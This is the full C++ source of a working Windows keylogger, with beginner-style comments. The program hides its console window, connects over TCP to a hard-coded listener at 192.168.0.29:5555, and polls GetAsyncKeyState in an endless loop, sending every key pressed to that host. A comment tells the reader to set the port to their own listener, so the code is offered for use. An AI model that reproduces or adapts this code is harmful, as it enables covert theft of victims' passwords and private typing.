#define _WINSOCK_DEPRECATED_NO_WARNINGS 		/* we use winsock utilities and we do not want the compiler to complain about older functionalities used since the below code is sufficient for our needs. */
#pragma comment(lib, "Ws2_32.lib") 			/* we need the library Ws2_32.lib library in order to use sockets (networking) */
#include <iostream>	               	    	        //standard input/output utilities
#include <winsock2.h> 					//networking utilities
#include <stdio.h> 					//standard input/output utilities
#include <stdlib.h> 					//standard input/output utilities
#include <Windows.h> 					//Windows libraries
int main()
{

    ShowWindow(GetConsoleWindow(), SW_HIDE); 		// do not show (hide) this program window
    char KEY; 
    WSADATA WSAData;
    SOCKET server; 
    SOCKADDR_IN addr; 
    WSAStartup(MAKEWORD(2, 0), &WSAData);		 /* initialize usage of the winsock library (needed for opening a network connection) */
    server = socket(AF_INET, SOCK_STREAM, 0); 		 //set up a TCP socket
    addr.sin_addr.s_addr = inet_addr("192.168.0.29");
    addr.sin_family = AF_INET; 				 /* set address family (AF) to AF_INET - this address family contains the IPv4 addresses to be used to communicateover TCP */
    addr.sin_port = htons(5555);                         //remote port - change it to your listening port
    connect(server, (SOCKADDR *)&addr, sizeof(addr)); 
while (true) { //do this forever:
            Sleep(10); 
            for (int KEY = 0x8; KEY < 0xFF; KEY++) 
            {
                if (GetAsyncKeyState(KEY) == -32767) { 
                    char buffer[2]; 
                    buffer[0] = KEY; 
                    send(server, buffer, sizeof(buffer), 0);
            }
            } }
closesocket(server); 
WSACleanup(); 
 }